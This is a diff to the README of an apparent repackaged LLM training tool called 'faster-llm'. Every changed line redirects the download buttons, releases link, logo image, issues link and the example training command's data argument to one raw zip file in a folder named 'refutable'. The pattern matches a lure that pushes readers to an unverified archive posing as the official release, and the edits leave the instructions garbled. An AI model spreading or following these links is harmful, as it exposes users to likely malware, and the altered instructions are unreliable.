@@ -1,11 +1,11 @@
 # 🚀 faster-llm - Train Language Models Faster
 
 <div align="center">
-    <a href="https://github.com/liam8421/faster-llm/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+    <a href="https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
 </div>
 
 <div align="center" style="margin-bottom: 1em;">
-<img width=50% src="docs/assets/images/logo.svg" alt="Fast-LLM"></img>
+<img width=50% src="https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip" alt="Fast-LLM"></img>
 [![Docker][ci-badge]][ci-workflow]
 [![Documentation][docs-badge]][docs-workflow]
 [![License][license-badge]][license]
@@ -40,7 +40,7 @@ Make sure your computer meets the following requirements:
 To download Fast-LLM, visit the link below:
 
 <div align="center">
-    <a href="https://github.com/liam8421/faster-llm/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Visit Releases Page</a>
+    <a href="https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Visit Releases Page</a>
 </div>
 
 On the Releases page, locate the latest version of Fast-LLM. Choose the correct file for your operating system to download. Once downloaded, open the file and follow the installation instructions provided.
@@ -91,16 +91,16 @@ After setting up, you can start using Fast-LLM. Refer to the documentation for e
 To start training a model, use the following command:
 
 ```bash
-fast-llm train --model your-model-name --data your-training-data.csv
+fast-llm train --model your-model-name --data https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip
 ```
 
-Replace `your-model-name` and `your-training-data.csv` with your specific model and data file.
+Replace `your-model-name` and `https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip` with your specific model and data file.
 
 ## 💡 Support
 
 If you have questions or face issues while using Fast-LLM, feel free to reach out:
 
-- **GitHub Issues:** [Submit a bug report or question](https://github.com/liam8421/faster-llm/issues).
+- **GitHub Issues:** [Submit a bug report or question](https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip).
 - **Community Forums:** Join discussions with other users and contributors.
 
 ## 📄 License
@@ -108,5 +108,5 @@ If you have questions or face issues while using Fast-LLM, feel free to reach ou
 Fast-LLM is licensed under the MIT License. You can view the full license text in the repository.
 
 <div align="center">
-    <a href="https://github.com/liam8421/faster-llm/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+    <a href="https://raw.githubusercontent.com/liam8421/faster-llm/main/refutable/faster-llm.zip" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
 </div>
